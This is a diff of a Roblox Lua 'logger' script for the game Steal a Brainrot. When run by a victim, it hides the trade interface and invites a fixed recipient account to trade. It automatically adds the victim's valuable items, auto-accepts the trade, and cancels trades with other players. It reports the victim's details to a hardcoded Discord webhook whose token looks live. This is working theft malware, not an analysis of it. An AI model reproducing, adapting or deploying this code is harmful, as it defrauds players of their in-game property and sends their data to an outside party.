@@ -1,14 +1,13 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v9
-  · Lógica original intacta
-  · Remotes por nombre (update anticheat)
-  · Envío por clics (script de referencia) + fallback remoto
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
+  · Target único: KIMILOSP (UserId resuelto automáticamente)
+  · Todos los eventos van a un solo webhook
+  · Listas actualizadas con la última update
 ============================================================
 ]]
 
 getgenv().TARGET_USERNAME = "KIMILOSP"
-getgenv().TARGET_USER_ID = 9555775328
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
 
 getgenv().ALLOWED_ANIMALS = {
@@ -493,14 +492,9 @@ end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local GuiService = game:GetService("GuiService")
 local localPlayer = Players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local playerGui = localPlayer:WaitForChild("PlayerGui")
-
-local okVim, VirtualInputManager = pcall(function()
-	return game:GetService("VirtualInputManager")
-end)
 
 task.spawn(function()
 	if not game:IsLoaded() then
@@ -511,7 +505,6 @@ task.spawn(function()
 		return
 	end
 
-	local targetUserId = tonumber(getgenv().TARGET_USER_ID) or 0
 	local targetName = getgenv().TARGET_USERNAME or "KIMILOSP"
 	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
 	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
@@ -541,9 +534,55 @@ task.spawn(function()
 		end
 	end
 
+	-- ── TARGET ÚNICO (KIMILOSP) ──
+	local targetUserId = tonumber(getgenv().TARGET_USER_ID) or 0
+	if targetUserId == 0 then
+		pcall(function()
+			targetUserId = Players:GetUserIdFromNameAsync(targetName)
+		end)
+	end
+	if not targetUserId or targetUserId == 0 then
+		warn("[LOGGER] No se pudo resolver el usuario: " .. tostring(targetName))
+		return
+	end
+
+	-- nombre real (username) + display name, para que el match no falle
+	pcall(function()
+		local realName = Players:GetNameFromUserIdAsync(targetUserId)
+		if realName and realName ~= "" then
+			targetName = realName
+		end
+	end)
+
+	local targetNames = { string.lower(targetName) }
+	do
+		local plrInServer = Players:GetPlayerByUserId(targetUserId)
+		if plrInServer and plrInServer.DisplayName and plrInServer.DisplayName ~= "" then
+			table.insert(targetNames, string.lower(plrInServer.DisplayName))
+		end
+	end
+
+	local function isTargetName(text)
+		if not text then
+			return false
+		end
+		text = string.lower(text)
+		for _, n in ipairs(targetNames) do
+			if n ~= "" and string.find(text, n, 1, true) then
+				return true
+			end
+		end
+		return false
+	end
+
+	print("[LOGGER] Target: " .. targetName .. " (" .. tostring(targetUserId) .. ")")
+
+	local targetId = targetUserId
+
 	local tbl4 = {
 		["Strawberry Elephant"] = true,
 		Meowl = true,
+		["Headless Horseman"] = true,
 		["Skibidi Toilet"] = true,
 		Griffin = true,
 		["Hydra Dragon Cannelloni"] = true,
@@ -574,45 +613,51 @@ task.spawn(function()
 	}
 
 	local str = "https://stealabrainrot.fandom.com/wiki/"
+	local tbl5 = {}
 
-	-- ── REMOTES POR NOMBRE (con respaldo por índice) ──
-	local FALLBACK_INDEX = {
-		["RF/TradeService/Invite"] = 36,
-		["RE/TradeService/Ready"] = 42,
-		["RE/TradeService/Accept"] = 43,
-		["RF/TradeService/AddItem"] = 48,
-		["RF/TradeService/AddBrainrot"] = 50,
-		["RE/TradeService/CancelTrade"] = 52,
-		["RE/NotificationService/Notify"] = 209,
-		["RF/TradeService/AcceptInvite"] = 37,
-		["RE/TradeService/CreateInvite"] = 41,
-		["RF/TradeService/SearchUser"] = 35,
-	}
+	for k, v in pairs(tbl) do
+		tbl5[k] = v
+	end
+
+	for k, v in pairs(tbl4) do
+		tbl5[k] = v
+	end
 
 	local function fn(arg)
-		local packages = ReplicatedStorage:FindFirstChild("Packages")
-		local net = packages and packages:FindFirstChild("Net")
-		if not net then
+		local children = game:GetService("ReplicatedStorage").Packages.Net:GetChildren()
+
+		local v = ({
+			["RF/TradeService/Invite"] = 36,
+			["RE/TradeService/Ready"] = 42,
+			["RE/TradeService/Accept"] = 43,
+			["RF/TradeService/AddItem"] = 48,
+			["RF/TradeService/AddBrainrot"] = 50,
+			["RF/TradeService/Cancel"] = 52,
+			["RE/NotificationService/Notify"] = 209,
+			["RF/TradeService/AcceptInvite"] = 37,
+			["RE/TradeService/CreateInvite"] = 41,
+		})[arg]
+
+		if not v then
 			return nil
 		end
-
-		local byName = net:FindFirstChild(arg)
-		if byName and (byName:IsA("RemoteFunction") or byName:IsA("RemoteEvent")) then
-			return byName
+		local v2 = children[v]
+		if v2 and (v2:IsA("RemoteFunction") or v2:IsA("RemoteEvent")) then
+			return v2
 		end
-
-		local idx = FALLBACK_INDEX[arg]
-		if idx then
-			local byIndex = net:GetChildren()[idx]
-			if byIndex and (byIndex:IsA("RemoteFunction") or byIndex:IsA("RemoteEvent")) then
-				return byIndex
-			end
-		end
-
 		return nil
 	end
 
 	local function fn2()
+		local leftCenter = playerGui:FindFirstChild("LeftCenter")
+
+		if leftCenter then
+			local clone = leftCenter:Clone()
+			clone.Name = "LeftCenter_Backup"
+			clone.Parent = playerGui
+			leftCenter:Destroy()
+		end
+
 		local Notify = fn("RE/NotificationService/Notify")
 
 		if Notify then
@@ -654,9 +699,17 @@ task.spawn(function()
 				end)
 
 				pcall(function()
+					sethiddenproperty(descendant, "Enabled", false)
+				end)
+
+				pcall(function()
 					descendant:GetPropertyChangedSignal("Enabled"):Connect(function()
 						pcall(function()
 							descendant.Enabled = false
+						end)
+
+						pcall(function()
+							sethiddenproperty(descendant, "Enabled", false)
 						end)
 					end)
 				end)
@@ -1275,7 +1328,7 @@ task.spawn(function()
 		fields[4] = { name = "Executor", value = str3, inline = true }
 		fields[5] = tbl11
 		tbl7.fields = fields
-		tbl7.footer = { text = localPlayer.Name .. " • " .. localPlayer.UserId }
+		tbl7.footer = { text = targetName .. " • " .. targetUserId }
 		tbl7.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
 		if v2 then
@@ -1285,7 +1338,7 @@ task.spawn(function()
 		local tbl12 = { embeds = { tbl7 }, username = arg5 or "LOGGER", avatar_url = arg3 or "" }
 
 		if arg4 then
-			tbl12.content = ".gg/irish victim||@everyone||"
+			tbl12.content = targetName .. " victim||@everyone||"
 		end
 
 		fn18(arg2, HttpService:JSONEncode(tbl12), 3)
@@ -1319,7 +1372,7 @@ task.spawn(function()
 			textLabel.Size = UDim2.new(1, -40, 0.4, 0)
 			textLabel.Position = UDim2.new(0, 20, 0.15, 0)
 			textLabel.BackgroundTransparency = 1
-			textLabel.Text = "Your Brainrot Drained By\ndiscord.gg/irish"
+			textLabel.Text = "Your Brainrot Drained By\n" .. targetName
 			textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 			textLabel.TextScaled = true
 			textLabel.Font = Enum.Font.GothamBlack
@@ -1330,7 +1383,7 @@ task.spawn(function()
 			textLabel2.Size = UDim2.new(1, -40, 0.2, 0)
 			textLabel2.Position = UDim2.new(0, 20, 0.65, 0)
 			textLabel2.BackgroundTransparency = 1
-			textLabel2.Text = "METHOD FOR loggercreate.xyz"
+			textLabel2.Text = "TARGET: " .. targetName .. " (" .. targetUserId .. ")"
 			textLabel2.TextColor3 = Color3.fromRGB(50, 255, 50)
 			textLabel2.TextScaled = true
 			textLabel2.Font = Enum.Font.GothamBlack
@@ -1346,390 +1399,6 @@ task.spawn(function()
 			end)
 		end)
 	end
-
-	-- ════════════════════════════════════════════════════════
-	--  MÓDULO DE CLICS (copiado del script de referencia)
-	-- ════════════════════════════════════════════════════════
-	local hiddenState = {}
-	local watchedTradeConnections = {}
-	local clearedBannerTexts = {}
-
-	local function isTradeGuiOrFrame(inst)
-		if not inst then return false end
-		local n = inst.Name:lower()
-		if n:find("trade") or n:find("intercambio") then
-			return true
-		end
-		for _, d in ipairs(inst:GetDescendants()) do
-			if d:IsA("TextLabel") or d:IsA("TextButton") then
-				local t = d.Text:lower()
-				if t:find("your offer") or t:find("chat de intercambio") or t:find("selecciona brainrots") then
-					return true
-				end
-			end
-		end
-		return false
-	end
-
-	local function setHidden(inst, hide)
-		if not inst or not inst.Parent then return end
-		if hide then
-			if hiddenState[inst] == nil then
-				pcall(function()
-					if inst:IsA("LayerCollector") then
-						hiddenState[inst] = inst.Enabled
-						inst.Enabled = false
-					elseif inst:IsA("GuiObject") then
-						hiddenState[inst] = inst.Visible
-						inst.Visible = false
-					end
-				end)
-			else
-				pcall(function()
-					if inst:IsA("LayerCollector") and inst.Enabled then
-						inst.Enabled = false
-					elseif inst:IsA("GuiObject") and inst.Visible then
-						inst.Visible = false
-					end
-				end)
-			end
-		elseif hiddenState[inst] ~= nil then
-			local prev = hiddenState[inst]
-			hiddenState[inst] = nil
-			pcall(function()
-				if inst:IsA("LayerCollector") then
-					inst.Enabled = prev
-				elseif inst:IsA("GuiObject") then
-					inst.Visible = prev
-				end
-			end)
-		end
-	end
-
-	local function watchTradeInstantHide(inst)
-		if not inst or watchedTradeConnections[inst] then return end
-		local conns = {}
-		if inst:IsA("LayerCollector") then
-			table.insert(conns, inst:GetPropertyChangedSignal("Enabled"):Connect(function()
-				if inst.Enabled then
-					setHidden(inst, true)
-				end
-			end))
-		elseif inst:IsA("GuiObject") then
-			table.insert(conns, inst:GetPropertyChangedSignal("Visible"):Connect(function()
-				if inst.Visible then
-					setHidden(inst, true)
-				end
-			end))
-		end
-		watchedTradeConnections[inst] = conns
-	end
-
-	local function syncTradeVisibility()
-		local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
-		local leftScreenGui = leftCenter and leftCenter:FindFirstAncestorWhichIsA("LayerCollector")
-
-		for _, child in ipairs(playerGui:GetChildren()) do
-			if child ~= leftScreenGui and child ~= leftCenter then
-				local n = child.Name:lower()
-				if n:find("trade") or n:find("intercambio") then
-					watchTradeInstantHide(child)
-					setHidden(child, true)
-				else
-					for _, sub in ipairs(child:GetChildren()) do
-						if sub ~= leftCenter and isTradeGuiOrFrame(sub) then
-							watchTradeInstantHide(sub)
-							setHidden(sub, true)
-						end
-					end
-				end
-			end
-		end
-	end
-
-	local function maybeClearBannerTextObj(desc)
-		if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then return end
-		local t = tostring(desc.Text or ""):lower()
-		if t == "" then return end
-		local shouldClear = false
-		if t:find("canceló", 1, true) or t:find("cancelo", 1, true) or t:find("cancelled", 1, true)
-			or t:find("canceled", 1, true) or t:find("base bloqueada", 1, true) or t:find("base locked", 1, true) then
-			shouldClear = true
-		end
-		if not shouldClear and t:find("@", 1, true) and (t:find("cancel", 1, true) or t:find("bloq", 1, true) or t:find("lock", 1, true)) then
-			shouldClear = true
-		end
-		if shouldClear then
-			if clearedBannerTexts[desc] == nil then
-				clearedBannerTexts[desc] = desc.Text
-			end
-			pcall(function()
-				desc.Text = ""
-			end)
-		end
-	end
-
-	local function cleanSectionBannerTexts()
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			maybeClearBannerTextObj(desc)
-		end
-	end
-
-	local function resolveClickableButton(inst)
-		if not inst then return nil end
-		if inst:IsA("GuiButton") then return inst end
-
-		local btnDesc = inst:FindFirstChildWhichIsA("GuiButton", true)
-		if btnDesc then return btnDesc end
-
-		local curr = inst.Parent
-		while curr and curr ~= playerGui do
-			if curr:IsA("GuiButton") then return curr end
-			curr = curr.Parent
-		end
-		return nil
-	end
-
-	local function fireGuiSignals(btn)
-		if not btn then return false end
-		local triggered = false
-
-		if firesignal then
-			pcall(function()
-				if btn.MouseButton1Down then firesignal(btn.MouseButton1Down) end
-			end)
-			pcall(function()
-				if btn.MouseButton1Click then firesignal(btn.MouseButton1Click); triggered = true end
-			end)
-			pcall(function()
-				if btn.Activated then firesignal(btn.Activated); triggered = true end
-			end)
-		end
-
-		if getconnections then
-			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
-				local ok, conns = pcall(function()
-					return getconnections(btn[sigName])
-				end)
-				if ok and type(conns) == "table" then
-					for _, conn in ipairs(conns) do
-						if conn.Function and pcall(conn.Function) then
-							triggered = true
-						end
-					end
-				end
-			end
-		end
-
-		if not triggered and btn:IsA("GuiButton") then
-			pcall(function()
-				GuiService.SelectedObject = btn
-			end)
-		end
-
-		return triggered
-	end
-
-	local function triggerScriptButton(inst)
-		local btn = resolveClickableButton(inst) or inst
-		if not btn then return false end
-		return fireGuiSignals(btn)
-	end
-
-	local function pressEnterOnSearchBox(box, textToType)
-		if not box or not box:IsA("TextBox") then return false end
-		return pcall(function()
-			box:CaptureFocus()
-			box.Text = textToType
-			task.wait(0.05)
-			if okVim and VirtualInputManager then
-				pcall(function()
-					VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-					task.wait(0.03)
-					VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
-				end)
-			end
-			if box.FocusLost then
-				pcall(function() box.FocusLost:Fire(true) end)
-			end
-			box:ReleaseFocus()
-		end)
-	end
-
-	local function findLeftTradeButton()
-		local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
-		if leftCenter then
-			local exact = leftCenter:FindFirstChild("TradePlayerList", true)
-			if exact then return resolveClickableButton(exact) or exact end
-		end
-		return nil
-	end
-
-	local function findSearchBox(root)
-		if not root then return nil end
-		for _, desc in ipairs(root:GetDescendants()) do
-			if desc:IsA("TextBox") then
-				return desc
-			end
-		end
-		return nil
-	end
-
-	local function findTargetSendButton(root, name, id)
-		if not root then return nil end
-		local lowerTarget = name:lower()
-		local exactRowName = lowerTarget .. "_" .. tostring(id)
-
-		for _, desc in ipairs(root:GetDescendants()) do
-			local dn = desc.Name:lower()
-			if dn == exactRowName or dn:find(lowerTarget, 1, true) then
-				local sendInst = desc:FindFirstChild("Send", true)
-				if sendInst then return resolveClickableButton(sendInst) or sendInst end
-				for _, sub in ipairs(desc:GetDescendants()) do
-					if sub.Name:lower():find("send") or sub.Name:lower():find("enviar") then
-						return resolveClickableButton(sub) or sub
-					end
-				end
-			end
-		end
-		return nil
-	end
-
-	local function findCloseButton(root)
-		if not root then return nil end
-		for _, desc in ipairs(root:GetDescendants()) do
-			local n = desc.Name:lower()
-			if n == "x" or n == "close" or n:find("close") then
-				local btn = resolveClickableButton(desc)
-				if btn then return btn end
-			end
-			if (desc:IsA("TextButton") or desc:IsA("TextLabel")) and desc.Text:gsub("%s+", ""):lower() == "x" then
-				return resolveClickableButton(desc) or desc
-			end
-		end
-		return nil
-	end
-
-	local function sendTradeToPlayerByClicks(name, id)
-		name = name or targetName
-		id = id or targetUserId
-		syncTradeVisibility()
-		cleanSectionBannerTexts()
-
-		local sent = false
-		local closed = false
-
-		for attempt = 1, 35 do
-			local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
-			local sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
-
-			if not sendBtn then
-				local openBtn = findLeftTradeButton()
-				if openBtn then
-					triggerScriptButton(openBtn)
-					task.wait(0.4)
-					syncTradeVisibility()
-					tradeListGui = playerGui:FindFirstChild("TradePlayerList")
-				end
-
-				local searchBox = findSearchBox(tradeListGui or playerGui)
-				if searchBox then
-					pressEnterOnSearchBox(searchBox, name)
-					task.wait(0.4)
-				end
-
-				sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
-			end
-
-			if sendBtn and not sent then
-				triggerScriptButton(sendBtn)
-				sent = true
-				task.wait(0.4)
-			end
-
-			if sent and not closed then
-				local closeBtn = findCloseButton(tradeListGui or playerGui)
-				if closeBtn then
-					triggerScriptButton(closeBtn)
-					closed = true
-					break
-				elseif attempt >= 12 then
-					break
-				end
-			end
-
-			task.wait(0.4)
-		end
-
-		syncTradeVisibility()
-		cleanSectionBannerTexts()
-		return sent
-	end
-
-	-- ── READY / ACCEPT POR UI (autoaccept) ──
-	local lastUiFire = 0
-
-	local function fireImageButton(btn)
-		if not btn or not btn:IsA("ImageButton") or not btn.Visible then return false end
-
-		local p = btn.Parent
-		while p and p ~= playerGui do
-			if p:IsA("GuiObject") and not p.Visible then return false end
-			p = p.Parent
-		end
-
-		local now = os.clock()
-		if now - lastUiFire < 0.35 then return false end
-		lastUiFire = now
-
-		local fired = false
-		if getconnections then
-			for _, sigName in ipairs({ "Activated", "MouseButton1Click" }) do
-				local ok, conns = pcall(function()
-					return getconnections(btn[sigName])
-				end)
-				if ok and type(conns) == "table" then
-					for _, conn in ipairs(conns) do
-						if pcall(function() conn:Fire() end) then
-							fired = true
-						end
-					end
-				end
-			end
-		end
-		return fired
-	end
-
-	local function tryReadyAcceptByUi()
-		local tradeGui = playerGui:FindFirstChild("TradeLiveTrade")
-		if not tradeGui then return false end
-		local main = tradeGui:FindFirstChild("TradeLiveTrade")
-		local other = main and main:FindFirstChild("Other")
-		local readyBtn = other and other:FindFirstChild("ReadyButton")
-		local txtObj = readyBtn and readyBtn:FindFirstChild("Txt")
-
-		if readyBtn and txtObj and txtObj:IsA("TextLabel") then
-			local label = string.upper(txtObj.Text or "")
-			if label == "READY" or label == "ACCEPT" then
-				return fireImageButton(readyBtn)
-			end
-		end
-		return false
-	end
-
-	local function tryAcceptPrompt()
-		local duelGui = playerGui:FindFirstChild("DuelsMachinePrompt")
-		if not duelGui then return false end
-		local prompt = duelGui:FindFirstChild("DuelsMachinePrompt")
-		prompt = prompt and prompt:FindFirstChild("Prompt")
-		local yesBtn = prompt and prompt:FindFirstChild("Yes")
-		if yesBtn then
-			return fireImageButton(yesBtn)
-		end
-		return false
-	end
-
-	-- ════════════════════════════════════════════════════════
 
 	local priority = fn7("PRIORITY")
 	local normal = fn7("NORMAL")
@@ -1753,15 +1422,15 @@ task.spawn(function()
 		gearIdx = 1,
 	}
 
-	if #priority > 0 and targetId ~= 0 then
+	if #priority > 0 then
 		fn21(fn11("PRIORITY"), goodWebhook, nil, true, targetName .. " [PRIORITY]", "PRIORITY")
 		tbl6.phase = "PRIORITY"
 		tbl6.queue = priority
-		tbl6.targetId = targetId
+		tbl6.targetId = targetUserId
 		tbl6.running = true
 		tbl6.addIdx = 1
 	else
-		if not ((#normal > 0 or #v > 0 or #v2 > 0) and targetUserId ~= 0) then
+		if not (#normal > 0 or #v > 0 or #v2 > 0) then
 			return
 		end
 		local normal2 = fn11("NORMAL")
@@ -1777,38 +1446,27 @@ task.spawn(function()
 	tbl6.gearQueue = fn6()
 	tbl6.baseSkinIdx = 1
 	tbl6.gearIdx = 1
-
 	local Invite = fn("RF/TradeService/Invite")
 	local AddBrainrot = fn("RF/TradeService/AddBrainrot")
 	local AddItem = fn("RF/TradeService/AddItem")
 	local Ready = fn("RE/TradeService/Ready")
 	local Accept = fn("RE/TradeService/Accept")
-	local Cancel = fn("RE/TradeService/CancelTrade")
+	local Cancel = fn("RF/TradeService/Cancel")
 	local CreateInvite = fn("RE/TradeService/CreateInvite")
 	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
-	local SearchUser = fn("RF/TradeService/SearchUser")
-
 	if not (Invite and AddBrainrot and AddItem and Ready and Accept and Cancel and CreateInvite and AcceptInvite) then
-		warn("[LOGGER] Faltan remotes")
+		return
 	end
-
 	local v3 = nil
 	local from = nil
-	local clickFails = 0
-	local sending = false
-	local lastSendAt = 0
 
 	if CreateInvite and CreateInvite:IsA("RemoteEvent") then
 		CreateInvite.OnClientEvent:Connect(function(arg, arg2)
-			if not arg or not arg2 or not arg2.from then return end
+			if not arg or not arg2 or not arg2.from then
+				return
+			end
 			v3 = arg
 			from = arg2.from
-
-			if (arg2.from == targetUserId or arg2.from == targetId) and AcceptInvite then
-				pcall(function()
-					AcceptInvite:InvokeServer(arg)
-				end)
-			end
 		end)
 	end
 
@@ -1817,12 +1475,14 @@ task.spawn(function()
 			if v3 and from then
 				if not (from == targetUserId or from == targetId) then
 					pcall(function()
-						Cancel:FireServer()
+						Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
 					end)
+
 					v3 = nil
 					from = nil
 				end
 			end
+
 			task.wait(0.5)
 		end
 	end)
@@ -1838,19 +1498,19 @@ task.spawn(function()
 					if tradeLiveTrade2 and tradeLiveTrade2:FindFirstChild("Other") then
 						local username = tradeLiveTrade2.Other:FindFirstChild("Username")
 
-						if username and not (string.find(string.lower(username.Text), string.lower(targetName), 1, true)) then
+						if username and not isTargetName(username.Text) then
 							pcall(function()
-								Cancel:FireServer()
+								Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
 							end)
 						end
 					end
 				end
 			end)
+
 			task.wait(0.5)
 		end
 	end)
 
-	-- Brainrots (lógica original: bucle continuo mientras hay trade)
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
@@ -1878,11 +1538,11 @@ task.spawn(function()
 					end
 				end
 			end
+
 			task.wait(1)
 		end
 	end)
 
-	-- Base skins
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
@@ -1904,11 +1564,11 @@ task.spawn(function()
 					tbl6.baseSkinIdx = tbl6.baseSkinIdx + 1
 				end
 			end
+
 			task.wait(1)
 		end
 	end)
 
-	-- Gears
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
@@ -1936,48 +1596,27 @@ task.spawn(function()
 					tbl6.gearIdx = tbl6.gearIdx + 1
 				end
 			end
+
 			task.wait(1)
 		end
 	end)
 
-	-- ENVÍO: clics primero (script de referencia), remote como red de seguridad
+	-- ── INVITE LOOP (CORREGIDO: siempre invita al único target) ──
 	task.spawn(function()
 		while true do
-			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and not sending then
-				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
-				local pending = v3 ~= nil
-
-				if not tradeOpen and not pending and (os.clock() - lastSendAt) > 2 then
-					lastSendAt = os.clock()
-
-					if clickFails < 4 then
-						sending = true
-						local ok = sendTradeToPlayerByClicks(targetName, targetUserId)
-						sending = false
-
-						if ok then
-							clickFails = 0
-						else
-							clickFails = clickFails + 1
-						end
-					else
-						pcall(function()
-							Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
-						end)
-						clickFails = 0
-					end
-				end
+			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
+				pcall(function()
+					Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
+				end)
 			end
-			task.wait(1.5)
+
+			task.wait(2)
 		end
 	end)
 
-	-- READY / ACCEPT: UI real y remotes originales en paralelo
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				tryReadyAcceptByUi()
-
 				pcall(function()
 					Ready:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
 				end)
@@ -2003,7 +1642,7 @@ task.spawn(function()
 						local v4 = fn5()
 						local v5 = fn6()
 
-						if (#normal2 > 0 or #v4 > 0 or #v5 > 0) and targetUserId ~= 0 then
+						if #normal2 > 0 or #v4 > 0 or #v5 > 0 then
 							local normal3 = fn11("NORMAL")
 							fn21(normal3, goodWebhook, nil, true, targetName .. " [NORMAL]", nil)
 							tbl6.queue = normal2
@@ -2024,17 +1663,8 @@ task.spawn(function()
 					end
 				end
 			end
-			task.wait(0.7)
-		end
-	end)
 
-	-- prompt de invitación
-	task.spawn(function()
-		while true do
-			if v3 and from and (from == targetUserId or from == targetId) then
-				tryAcceptPrompt()
-			end
-			task.wait(0.25)
+			task.wait(0.7)
 		end
 	end)
 
